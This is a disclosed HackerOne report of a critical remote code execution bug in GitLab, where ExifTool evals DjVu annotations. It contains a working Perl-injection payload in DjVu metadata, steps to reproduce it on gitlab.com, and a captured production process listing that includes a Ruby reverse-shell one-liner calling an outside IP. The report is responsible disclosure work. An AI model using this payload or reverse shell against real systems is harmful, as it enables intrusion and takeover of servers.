# RCE when removing metadata with ExifTool

## Report Details
- **Report ID**: 1154542
- **URL**: https://hackerone.com/reports/1154542
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-04-07T13:59:49.750Z
- **Disclosed**: 2021-05-14T20:08:32.101Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags.

An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.

One of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to "convert C escape sequences". 

There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:

```
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

{F1257008} is an example DjVu file with the above metadata, and {F1257009} is an example that runs a reverse shell.

### Steps to reproduce
1. Download {F1257008} and unzip it
1. Create a new snippet
1. In the description field, hit "Attach a file"
1. Select and uplaod `echo_vakzz.jpg`
1. See that the file `/tmp/vakzz` has been created on the server


Uploading {F1257009} to https://gitlab.com/-/snippets/new resulted in a shell on `web-09-sv-gprd`:

```
Connection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)
id
uid=500(git) gid=500(git) groups=500(git)
hostname -a
web-09-sv-gprd
ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init
root         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<    2020   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]
root         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]
root        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]
root        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]
root        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]
root        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]
root        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]
root        24  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/2:0H]
root        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]
root        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]
root        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]
root        28  0.0  0.0      0     0 ?        S     2020  17:57 [ksoftirqd/3]
root        30  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/3:0H]
root        31  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/4]
root        32  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/4]
root        33  0.0  0.0      0     0 ?        S     2020   1:05 [migration/4]
root        34  0.0  0.0      0     0 ?        S     2020  17:09 [ksoftirqd/4]
root        36  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/4:0H]
root        37  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/5]
root        38  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/5]
root        39  0.0  0.0      0     0 ?        S     2020   1:05 [migration/5]
root        40  0.0  0.0      0     0 ?        S     2020  16:56 [ksoftirqd/5]
root        42  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/5:0H]
root        43  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/6]
root        44  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/6]
root        45  0.0  0.0      0     0 ?        S     2020   1:05 [migration/6]
root        46  0.0  0.0      0     0 ?        S     2020  16:33 [ksoftirqd/6]
root        48  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/6:0H]
root        49  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/7]
root        50  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/7]
root        51  0.0  0.0      0     0 ?        S     2020   1:05 [migration/7]
root        52  0.0  0.0      0     0 ?        S     2020  16:25 [ksoftirqd/7]
root        54  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/7:0H]
root        55  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/8]
root        56  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/8]
root        57  0.0  0.0      0     0 ?        S     2020   1:06 [migration/8]
root        58  0.0  0.0      0     0 ?        S     2020  16:22 [ksoftirqd/8]
root        60  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/8:0H]
root        61  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/9]
root        62  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/9]
root        63  0.0  0.0      0     0 ?        S     2020   1:05 [migration/9]
root        64  0.0  0.0      0     0 ?        S     2020  15:52 [ksoftirqd/9]
root        66  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/9:0H]
root        67  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/10]
root        68  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/10]
root        69  0.0  0.0      0     0 ?        S     2020   1:06 [migration/10]
root        70  0.0  0.0      0     0 ?        S     2020  16:10 [ksoftirqd/10]
root        72  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/10:0H]
root        73  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/11]
root        74  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/11]
root        75  0.0  0.0      0     0 ?        S     2020   1:06 [migration/11]
root        76  0.0  0.0      0     0 ?        S     2020  16:08 [ksoftirqd/11]
root        78  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/11:0H]
root        79  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/12]
root        80  0.0  0.0      0     0 ?        S     2020   1:09 [watchdog/12]
root        81  0.0  0.0      0     0 ?        S     2020   1:03 [migration/12]
root        82  0.0  0.0      0     0 ?        S     2020  17:07 [ksoftirqd/12]
root        84  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/12:0H]
root        85  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/13]
root        86  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/13]
root        87  0.0  0.0      0     0 ?        S     2020   1:06 [migration/13]
root        88  0.0  0.0      0     0 ?        S     2020  16:45 [ksoftirqd/13]
root        90  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/13:0H]
root        91  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/14]
root        92  0.0  0.0      0     0 ?        S     2020   1:04 [watchdog/14]
root        93  0.0  0.0      0     0 ?        S     2020   1:05 [migration/14]
root        94  0.0  0.0      0     0 ?        S     2020  16:27 [ksoftirqd/14]
root        96  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/14:0H]
root        97  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/15]
root        98  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/15]
root        99  0.0  0.0      0     0 ?        S     2020   1:07 [migration/15]
root       100  0.0  0.0      0     0 ?        S     2020  16:35 [ksoftirqd/15]
root       102  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/15:0H]
root       103  0.0  0.0      0     0 ?        S     2020   0:00 [kdevtmpfs]
root       104  0.0  0.0      0     0 ?        I<    2020   0:00 [netns]
root       105  0.0  0.0      0     0 ?        S     2020   0:00 [rcu_tasks_kthre]
root       106  0.0  0.0      0     0 ?        S     2020   0:00 [kauditd]
root       110  0.0  0.0      0     0 ?        S     2020   0:33 [khungtaskd]
root       111  0.0  0.0      0     0 ?        S     2020   0:11 [oom_reaper]
root       112  0.0  0.0      0     0 ?        I<    2020   0:00 [writeback]
root       113  0.0  0.0      0     0 ?        S     2020   0:51 [kcompactd0]
root       114  0.0  0.0      0     0 ?        SN    2020   0:00 [ksmd]
root       115  0.0  0.0      0     0 ?        SN    2020   3:10 [khugepaged]
root       116  0.0  0.0      0     0 ?        I<    2020   0:00 [crypto]
root       117  0.0  0.0      0     0 ?        I<    2020   0:00 [kintegrityd]
root       118  0.0  0.0      0     0 ?        I<    2020   0:00 [kblockd]
root       119  0.0  0.0      0     0 ?        I<    2020   0:00 [ata_sff]
root       120  0.0  0.0      0     0 ?        I<    2020   0:00 [md]
root       121  0.0  0.0      0     0 ?        I<    2020   0:00 [edac-poller]
root       122  0.0  0.0      0     0 ?        I<    2020   0:00 [devfreq_wq]
root       123  0.0  0.0      0     0 ?        I<    2020   0:00 [watchdogd]
root       127  0.0  0.0      0     0 ?        S     2020  76:51 [kswapd0]
root       128  0.0  0.0      0     0 ?        I<    2020   0:00 [kworker/u33:0]
root       129  0.0  0.0      0     0 ?        S     2020   0:00 [ecryptfs-kthrea]
root       172  0.0  0.0      0     0 ?        I<    2020   0:00 [kthrotld]
root       173  0.0  0.0      0     0 ?        I<    2020   0:00 [acpi_thermal_pm]
root       174  0.0  0.0      0     0 ?        S     2020   0:00 [scsi_eh_0]
root       175  0.0  0.0      0     0 ?        I<    2020   0:00 [scsi_tmf_0]
root       183  0.0  0.0      0     0 ?        I<    2020   0:00 [ipv6_addrconf]
root       195  0.0  0.0      0     0 ?        I<    2020   0:00 [kstrp]
root       212  0.0  0.0      0     0 ?        I<    2020   0:00 [charger_manager]
root       406  0.0  0.0      0     0 ?        I<    2020   0:00 [raid5wq]
root       454  0.0  0.0      0     0 ?        S     2020  10:42 [jbd2/sda1-8]
root       455  0.0  0.0      0     0 ?        I<    2020   0:00 [ext4-rsv-conver]
root       515  0.0  0.0      0     0 ?        I<    2020  11:09 [kworker/12:1H]
root       522  0.0  0.0      0     0 ?        I<    2020   0:00 [iscsi_eh]
root       525  0.0  0.0      0     0 ?        I<    2020   0:00 [ib-comp-wq]
root       526  0.0  0.0      0     0 ?        I<    2020   0:00 [ib-comp-unb-wq]
root       527  0.0  0.0      0     0 ?        I<    2020   0:00 [ib_mcast]
root       528  0.0  0.0      0     0 ?        I<    2020   0:00 [ib_nl_sa_wq]
root       531  0.0  0.0      0     0 ?        I<    2020   0:00 [rdma_cm]
root       542  0.0  0.0      0     0 ?        I<    2020  10:56 [kworker/6:1H]
root       549  0.0  0.0      0     0 ?        I<    2020   0:00 [rpciod]
root       550  0.0  0.0      0     0 ?        I<    2020   0:00 [xprtiod]
root       565  0.0  0.0 102968   824 ?        Ss    2020   0:00 /sbin/lvmetad -f
root       595  0.0  0.0  42604  3368 ?        Ss    2020   2:12 /lib/systemd/systemd-udevd
root       596  0.0  0.0  12204  4680 ?        Ss    2020 451:18 /usr/sbin/haveged --Foreground --verbose=1 -w 1024
root       597  0.0  0.0  97900 38924 ?        Ss    2020 113:30 /lib/systemd/systemd-journald
root       763  0.0  0.0      0     0 ?        S     2020   0:00 [hwrng]
root       798  0.0  0.0      0     0 ?        I<    2020   1:33 [kworker/13:1H]
root       814  0.0  0.0      0     0 ?        S     2020  12:32 [jbd2/sdb-8]
root       815  0.0  0.0      0     0 ?        I<    2020   0:00 [ext4-rsv-conver]
prometh+   969  0.6  0.0 720896 31292 ?        Sl    2020 1997:39 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ --collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$
root      1224  0.0  0.0      0     0 ?        I<    2020   1:36 [kworker/10:1H]
root      1230  0.0  0.0  16124  2920 ?        Ss    2020   0:01 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4
root      1386  0.0  0.0   5220   112 ?        Ss    2020   6:09 /sbin/iscsid
root      1389  0.0  0.0   5720  3512 ?        S<Ls  2020  29:44 /sbin/iscsid
root      1407  0.0  0.0 382660   408 ?        Ssl   2020   3:07 /usr/bin/lxcfs /var/lib/lxcfs/
root      1426  0.0  0.0  27728  2320 ?        Ss    2020   3:41 /usr/sbin/cron -f
syslog    1446  0.0  0.0 256392  2112 ?        Ssl   2020  56:37 /usr/sbin/rsyslogd -n
root      1476  0.0  0.0  28628  2648 ?        Ss    2020   0:51 /lib/systemd/systemd-logind
root      1512  0.0  0.0   4396  1208 ?        Ss    2020   0:00 /usr/sbin/acpid
daemon    1525  0.0  0.0  26044  1464 ?        Ss    2020   0:00 /usr/sbin/atd -f
postfix   1570  0.0  0.0  67476  4488 ?        S    12:40   0:00 pickup -l -t fifo -u
root      1593  0.0  0.0   4392   904 ?        Ss    2020   7:41 runsvdir -P /etc/service log: /process HTTP/1.1" 200 153 - -> /process 10.219.1.10 - - [07/Apr/2021:13:13:54 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.9 - - [07/Apr/2021:13:13:58 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.10 - - [07/Apr/2021:13:14:09 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.9 - - [07/Apr/2021:13:14:13 UTC] "GET /process HTTP/1.1" 200 153 - -> /process
git       1594 50.1  2.0 2843912 1351680 ?     Sl   12:40  17:00 puma: cluster worker 0: 7369 [gitlab-puma-worker]
message+  1599  0.0  0.0  43028  3356 ?        Ss    2020   1:36 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1615  0.0  0.0   4240  1200 ?        Ss    2020   0:26 runsv apt_metrics
root      1617  0.0  0.0   4240  1104 ?        Ss    2020   0:03 runsv node_exporter
root      1618  0.0  0.0   4240  1104 ?        Ss    2020   4:24 runsv ntpd_metrics
root      1620  0.0  0.0   4240   380 ?        Ss    2020   0:00 runsv gitlab-monitor
root      1621  0.0  0.0   4240   388 ?        Ss    2020   0:00 runsv mtail
root      1623  0.0  0.0      0     0 ?        I<    2020  15:18 [kworker/0:1H]
root      1624  0.0  0.0   4384   252 ?        S     2020   0:04 svlogd -tt /var/log/mtail
root      1625  0.0  0.0   4384   380 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics
root      1626  0.0  0.0   4384   224 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics
root      1627  0.0  0.0   4384   236 ?        S     2020   0:02 svlogd -tt /var/log/prometheus/node_exporter
root      1628  0.0  0.0   4384   240 ?        S     2020   0:00 svlogd -tt /var/log/gitlab-monitor
root      1713  0.0  0.0  13372   908 ?        Ss    2020   0:02 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1716  0.0  0.0      0     0 ?        I<    2020   0:46 [kworker/14:1H]
root      1844  0.0  0.0      0     0 ?        I<    2020   0:00 [nfsiod]
root      1850  0.0  0.0 277088  2224 ?        Ssl   2020   0:36 /usr/lib/policykit-1/polkitd --no-debug
root      1878  0.0  0.0      0     0 ?        I<    2020   5:54 [kworker/2:1H]
root      2084  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:0]
root      2095  0.0  0.0  65512  3084 ?        Ss    2020   0:04 /usr/sbin/sshd -D
root      2102  0.0  0.0      0     0 ?        I<    2020   2:31 [kworker/9:1H]
root      2120  0.0  0.0      0     0 ?        I<    2020   5:08 [kworker/3:1H]
root      2138  0.0  0.0      0     0 ?        I<    2020   0:31 [kworker/15:1H]
root      2146  0.0  0.0      0     0 ?        I<    2020  23:45 [kworker/1:1H]
root      2151  0.0  0.0      0     0 ?        I<    2020   0:40 [kworker/4:1H]
root      2167  0.0  0.0  14656  1372 tty1     Ss+   2020   0:00 /sbin/agetty --noclear tty1 linux
root      2177  0.0  0.0  14472  1556 ttyS0    Ss+   2020   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
ntp       2204  0.0  0.0  40268  2576 ?        Ss    2020  21:06 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116
root      2270  0.0  0.0  67480 18788 ?        Ss    2020  17:03 /usr/bin/python3 /usr/bin/google_ip_forwarding_daemon
root      2272  0.0  0.0  67220 16368 ?        Ss    2020  10:50 /usr/bin/python3 /usr/bin/google_clock_skew_daemon
root      2402  0.0  0.0  65408  2460 ?        Ss    2020   1:05 /usr/lib/postfix/sbin/master
postfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u
root      2571  0.0  0.0   4392   848 ?        Ss    2020   2:50 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................
root      2618  0.0  0.0   4240  1104 ?        Ss    2020   0:01 runsv puma
root      2621  0.0  0.0   4240  1192 ?        Ss    2020   0:05 runsv logrotate
root      2623  0.0  0.0   4240  1144 ?        Ss    2020   0:00 runsv nginx
root      2625  0.0  0.0   4240  1092 ?        Ss    2020   0:01 runsv gitlab-workhorse
gitlab-+  3150  0.0  0.0 754368 26924 ?        Sl   Feb17  35:28 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml
root      3164  0.0  0.0      0     0 ?        I<    2020   0:12 [kworker/11:1H]
root      3211  0.2  0.0      0     0 ?        I    12:42   0:04 [kworker/u32:2]
root      3222  0.0  0.0      0     0 ?        I<    2020   0:15 [kworker/7:1H]
root      3463  0.0  0.0      0     0 ?        I    10:35   0:00 [kworker/5:1]
root      3511  0.0  0.0      0     0 ?        I    11:40   0:00 [kworker/12:0]
root      4032  0.0  0.1 1571276 107596 ?      Ssl   2020 172:34 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml
root      4171  0.0  0.0   4376   640 ?        S    13:12   0:00 sleep 600
root      4302  0.0  0.0      0     0 ?        I<    2020   2:25 [kworker/5:1H]
root      4391  0.0  0.0      0     0 ?        I<    2020   0:14 [kworker/8:1H]
root      4699  0.0  0.0      0     0 ?        I    11:09   0:00 [kworker/13:2]
root      4812  0.0  0.0   4376   672 ?        S    13:13   0:00 sleep 60
root      5375  0.0  0.0   4504   788 ?        Ss   13:13   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper
root      5379  0.0  0.0   4376   748 ?        S    13:13   0:00 sleep 600
git       5398 49.7  1.9 2661404 1274712 ?     Sl   12:44  14:43 puma: cluster worker 3: 7369 [gitlab-puma-worker]
git       5544  1.3  0.0  45604 27664 ?        S    13:14   0:00 /usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -ImageSize -Copyright -CopyrightNotice -Orientation -
git       5545  0.0  0.0      0     0 ?        Z    13:14   0:00 [sh] <defunct>
git       5551  0.0  0.0 105260 10840 ?        S    13:14   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
git       5667  0.0  0.0   4504   740 ?        S    13:14   0:00 sh -c ps auxww
git       5668  0.0  0.0  34424  2864 ?        R    13:14   0:00 ps auxww
root      5952  0.0  0.0      0     0 ?        I    00:24   0:00 [kworker/5:2]
root      6812  0.0  0.0  54640  7080 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx
gitlab-+  6813  0.0  0.0  59476 12544 ?        S    Mar08  18:42 nginx: worker process
gitlab-+  6814  0.0  0.0  59380 13704 ?        S    Mar08  18:28 nginx: worker process
gitlab-+  6815  0.0  0.0  59504 13088 ?        S    Mar08  18:57 nginx: worker process
gitlab-+  6816  0.0  0.0  59456 13048 ?        S    Mar08  19:35 nginx: worker process
gitlab-+  6817  0.0  0.0  59468 13396 ?        S    Mar08  18:41 nginx: worker process
gitlab-+  6818  0.0  0.0  59508 13700 ?        S    Mar08  20:20 nginx: worker process
gitlab-+  6819  0.0  0.0  59492 13220 ?        S    Mar08  19:33 nginx: worker process
gitlab-+  6820  0.0  0.0  59460 13420 ?        S    Mar08  22:00 nginx: worker process
gitlab-+  6821  0.0  0.0  59508 13420 ?        S    Mar08  24:15 nginx: worker process
gitlab-+  6822  0.0  0.0  59500 13348 ?        S    Mar08  20:53 nginx: worker process
gitlab-+  6823  0.0  0.0  59660 13588 ?        S    Mar08  27:47 nginx: worker process
gitlab-+  6824  0.0  0.0  59972 14116 ?        S    Mar08  37:52 nginx: worker process
gitlab-+  6825  4.0  0.0  63940 18592 ?        S    Mar08 1788:21 nginx: worker process
gitlab-+  6826  1.9  0.0  61436 15808 ?        S    Mar08 854:41 nginx: worker process
gitlab-+  6827  0.1  0.0  60120 14564 ?        S    Mar08  79:52 nginx: worker process
gitlab-+  6828  0.8  0.0  62348 16532 ?        S    Mar08 351:59 nginx: worker process
gitlab-+  6829  0.0  0.0  54836  3732 ?        S    Mar08   0:08 nginx: cache manager process
git       6952 17.6  0.1 1532460 109784 ?      Ssl  10:04  33:35 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml
git       7369 10.3  1.5 1859556 1033020 ?     Ssl  10:04  19:41 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]
root      7522  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/11:2]
root      8263  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/14:0]
root      8266  0.0  0.0      0     0 ?        I    08:19   0:00 [kworker/0:2]
root      8581  0.1  0.0      0     0 ?        I    12:48   0:02 [kworker/u32:1]
root      9122  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/8:0]
git       9978 47.0  2.0 3182348 1362056 ?     Sl   11:43  42:45 puma: cluster worker 8: 7369 [gitlab-puma-worker]
consul   10871  0.5  0.2 257480 143704 ?       Ssl   2020 2836:38 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d
git      10980 51.1  1.8 2507012 1229264 ?     Sl   12:49  12:43 puma: cluster worker 2: 7369 [gitlab-puma-worker]
influxd+ 12182  0.0  0.0 188928  1044 ?        Ssl   2020   0:14 /usr/bin/influxdb-relay -config /etc/influxdb-relay/influxdb-relay.conf
root     12322  0.0  0.0      0     0 ?        I    12:49   0:00 [kworker/11:1]
root     12828  0.0  0.0   4384  1276 ?        S     2020   0:01 svlogd -tt /var/log/gitlab/puma
root     12831  0.2  0.0   4384  1228 ?        S     2020 1318:06 svlogd /var/log/gitlab/gitlab-workhorse
root     12853  0.0  0.0   4384  1260 ?        S     2020   0:02 svlogd -tt /var/log/gitlab/nginx
root     12856  0.0  0.0   4384   340 ?        S     2020   0:00 svlogd -tt /var/log/gitlab/logrotate
git      13196 48.0  2.1 2935068 1437312 ?     Sl   12:17  27:28 puma: cluster worker 10: 7369 [gitlab-puma-worker]
root     13379  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/7:1]
root     13382  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/10:1]
root     13611  1.0  0.0 1740892 38864 ?       Ssl  Jan29 1042:19 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false
root     14478  0.0  0.0      0     0 ?        I    09:24   0:00 [kworker/2:0]
git      17155 50.3  1.8 2541576 1218444 ?     Sl   12:50  11:50 puma: cluster worker 15: 7369 [gitlab-puma-worker]
root     17904  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/2:2]
git      21109 48.3  1.9 2572804 1258580 ?     Sl   12:55   9:17 puma: cluster worker 5: 7369 [gitlab-puma-worker]
root     21296  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/8:1]
root     21299  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/1:0]
root     21301  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/7:0]
root     21306  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/15:1]
root     21376  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/9:0]
git      21698 48.0  2.2 3093788 1459416 ?     Sl   12:26  23:00 puma: cluster worker 9: 7369 [gitlab-puma-worker]
root     22003  0.2  0.0      0     0 ?        I    12:26   0:05 [kworker/u32:3]
root     22131  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/9:2]
root     22135  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/4:2]
root     22142  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/12:3]
root     22143  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/3:1]
root     22144  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/13:0]
root     22863  0.0  0.0 161112 54712 ?        Ssl  Jan18   0:15 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300
root     24237  0.0  0.0 288904 59208 ?        Sl   Mar10   6:50 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid
root     24242 20.6  0.5 3044156 391860 ?      Sl   Mar10 8337:18 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor
git      24253 51.3  2.0 2857244 1349560 ?     Sl   12:29  23:03 puma: cluster worker 13: 7369 [gitlab-puma-worker]
root     24667  0.1  0.0      0     0 ?        I    11:29   0:11 [kworker/u32:4]
root     24911  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:2]
root     25156  0.2  0.0      0     0 ?        I    12:59   0:01 [kworker/u32:5]
root     25516  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/1:1]
git      25517 50.4  2.1 2870560 1443204 ?     Sl   12:30  21:58 puma: cluster worker 6: 7369 [gitlab-puma-worker]
git      25521 49.9  1.8 2550792 1218900 ?     Sl   13:00   7:06 puma: cluster worker 4: 7369 [gitlab-puma-worker]
root     25525  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/3:2]
root     25527  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/15:2]
root     26983  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/10:2]
root     27893  0.0  0.0      0     0 ?        I<    2020   0:00 [xfsalloc]
root     27894  0.0  0.0      0     0 ?        I<    2020   0:00 [xfs_mru_cache]
git      28051 49.9  1.8 2635012 1248076 ?     Sl   13:03   5:34 puma: cluster worker 11: 7369 [gitlab-puma-worker]
git      28140 50.3  2.1 2943756 1397844 ?     Sl   12:33  20:26 puma: cluster worker 14: 7369 [gitlab-puma-worker]
git      29132 49.0  2.0 3164444 1367952 ?     Sl   12:05  33:39 puma: cluster worker 1: 7369 [gitlab-puma-worker]
root     30224  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/14:1]
root     30233  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/0:1]
root     31940  0.0  0.0 278944 10648 ?        Ssl   2020   6:14 /usr/lib/accountsservice/accounts-daemon
root     32135  0.1  0.0      0     0 ?        I    13:07   0:00 [kworker/u32:0]
root     32388  0.0  0.0      0     0 ?        I    01:32   0:00 [kworker/4:0]
